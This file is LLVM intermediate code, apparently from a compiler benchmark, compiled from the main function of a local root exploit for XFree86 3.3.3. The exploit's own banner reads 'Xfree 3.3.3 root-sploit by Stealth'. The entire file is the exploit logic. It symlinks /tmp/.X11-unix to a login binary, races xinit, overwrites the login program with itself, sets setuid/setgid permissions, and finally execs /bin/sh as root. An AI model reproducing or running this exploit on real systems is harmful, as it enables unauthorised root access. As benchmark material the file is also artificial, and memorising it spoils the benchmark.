; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19257.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19257.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@TELNET = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [10 x i8] c"localhost\00", align 1
@.str.1 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@__const.main.shell = private unnamed_addr constant [2 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i32 0, i32 0), i8* null], align 16
@.str.2 = private unnamed_addr constant [21 x i8] c"/usr/X11R6/bin/xinit\00", align 1
@__const.main.X = private unnamed_addr constant [2 x i8*] [i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i32 0, i32 0), i8* null], align 16
@LOGIN = common dso_local global i8* null, align 8
@.str.3 = private unnamed_addr constant [7 x i8] c"/tmp/L\00", align 1
@.str.4 = private unnamed_addr constant [10 x i8] c"Welcome!\0A\00", align 1
@.str.5 = private unnamed_addr constant [15 x i8] c"/tmp/.X11-unix\00", align 1
@.str.6 = private unnamed_addr constant [25 x i8] c"symlink (/tmp/.X11-unix)\00", align 1
@errno = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [5 x i8] c"fork\00", align 1
@.str.8 = private unnamed_addr constant [7 x i8] c"fatal:\00", align 1
@.str.9 = private unnamed_addr constant [62 x i8] c"Xfree 3.3.3 root-sploit by Stealth. http://www.kalug.lug.net\0A\00", align 1
@.str.10 = private unnamed_addr constant [40 x i8] c"\0A-> Please give me some seconds... <-\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [3 x i8*], align 16
  %7 = alloca [2 x i8*], align 16
  %8 = alloca [2 x i8*], align 16
  %9 = alloca i32*, align 8
  %10 = alloca i32, align 4
  %11 = alloca [1000 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = getelementptr inbounds [3 x i8*], [3 x i8*]* %6, i64 0, i64 0
  %13 = load i8*, i8** @TELNET, align 8
  store i8* %13, i8** %12, align 8
  %14 = getelementptr inbounds i8*, i8** %12, i64 1
  store i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str, i64 0, i64 0), i8** %14, align 8
  %15 = getelementptr inbounds i8*, i8** %14, i64 1
  store i8* null, i8** %15, align 8
  %16 = bitcast [2 x i8*]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %16, i8* align 16 bitcast ([2 x i8*]* @__const.main.shell to i8*), i64 16, i1 false)
  %17 = bitcast [2 x i8*]* %8 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %17, i8* align 16 bitcast ([2 x i8*]* @__const.main.X to i8*), i64 16, i1 false)
  store i32* null, i32** %9, align 8
  store i32 0, i32* %10, align 4
  %18 = bitcast [1000 x i8]* %11 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %18, i8 0, i64 1000, i1 false)
  %19 = call i32 (...) @geteuid()
  %20 = icmp ne i32 %19, 0
  br i1 %20, label %21, label %24

21:                                               ; preds = %2
  %22 = call i32 (...) @getuid()
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %38, label %24

24:                                               ; preds = %21, %2
  %25 = load i8*, i8** @LOGIN, align 8
  %26 = call i32 @unlink(i8* %25)
  %27 = load i8*, i8** @LOGIN, align 8
  %28 = call i32 @cp(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0), i8* %27, i32 1)
  %29 = load i8*, i8** @LOGIN, align 8
  %30 = call i32 @chmod(i8* %29, i32 2413)
  %31 = call i32 @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.4, i64 0, i64 0))
  %32 = call i32 @unlink(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.5, i64 0, i64 0))
  %33 = call i32 @unlink(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0))
  %34 = getelementptr inbounds [2 x i8*], [2 x i8*]* %7, i64 0, i64 0
  %35 = load i8*, i8** %34, align 16
  %36 = getelementptr inbounds [2 x i8*], [2 x i8*]* %7, i64 0, i64 0
  %37 = call i32 @execve(i8* %35, i8** %36, i32* null)
  br label %38

38:                                               ; preds = %24, %21
  %39 = load i8*, i8** @LOGIN, align 8
  %40 = call i32 @cp(i8* %39, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0), i32 1)
  %41 = load i8*, i8** @LOGIN, align 8
  %42 = call i64 @symlink(i8* %41, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.5, i64 0, i64 0))
  %43 = icmp slt i64 %42, 0
  br i1 %43, label %44, label %48

44:                                               ; preds = %38
  %45 = call i32 @perror(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.6, i64 0, i64 0))
  %46 = load i32, i32* @errno, align 4
  %47 = call i32 @exit(i32 %46) #4
  unreachable

48:                                               ; preds = %38
  %49 = call i32 (...) @fork()
  store i32 %49, i32* %10, align 4
  %50 = icmp slt i32 %49, 0
  br i1 %50, label %51, label %55

51:                                               ; preds = %48
  %52 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.7, i64 0, i64 0))
  %53 = load i32, i32* @errno, align 4
  %54 = call i32 @exit(i32 %53) #4
  unreachable

55:                                               ; preds = %48
  %56 = load i32, i32* %10, align 4
  %57 = icmp sgt i32 %56, 0
  br i1 %57, label %58, label %72

58:                                               ; preds = %55
  %59 = call i32 @sleep(i32 7)
  %60 = load i32, i32* %10, align 4
  %61 = call i32 @kill(i32 %60, i32 9)
  %62 = load i8**, i8*** %5, align 8
  %63 = getelementptr inbounds i8*, i8** %62, i64 0
  %64 = load i8*, i8** %63, align 8
  %65 = load i8*, i8** @LOGIN, align 8
  %66 = call i32 @cp(i8* %64, i8* %65, i32 1)
  %67 = getelementptr inbounds [3 x i8*], [3 x i8*]* %6, i64 0, i64 0
  %68 = load i8*, i8** %67, align 16
  %69 = getelementptr inbounds [3 x i8*], [3 x i8*]* %6, i64 0, i64 0
  %70 = call i32 @execve(i8* %68, i8** %69, i32* null)
  %71 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.8, i64 0, i64 0))
  br label %79

72:                                               ; preds = %55
  %73 = call i32 @printf(i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.9, i64 0, i64 0))
  %74 = call i32 @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.10, i64 0, i64 0))
  %75 = getelementptr inbounds [2 x i8*], [2 x i8*]* %8, i64 0, i64 0
  %76 = load i8*, i8** %75, align 16
  %77 = getelementptr inbounds [2 x i8*], [2 x i8*]* %8, i64 0, i64 0
  %78 = call i32 @execve(i8* %76, i8** %77, i32* null)
  br label %79

79:                                               ; preds = %72, %58
  br label %80

80:                                               ; preds = %79
  ret i32 0
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #1

declare dso_local i32 @geteuid(...) #2

declare dso_local i32 @getuid(...) #2

declare dso_local i32 @unlink(i8*) #2

declare dso_local i32 @cp(i8*, i8*, i32) #2

declare dso_local i32 @chmod(i8*, i32) #2

declare dso_local i32 @printf(i8*) #2

declare dso_local i32 @execve(i8*, i8**, i32*) #2

declare dso_local i64 @symlink(i8*, i8*) #2

declare dso_local i32 @perror(i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @fork(...) #2

declare dso_local i32 @sleep(i32) #2

declare dso_local i32 @kill(i32, i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
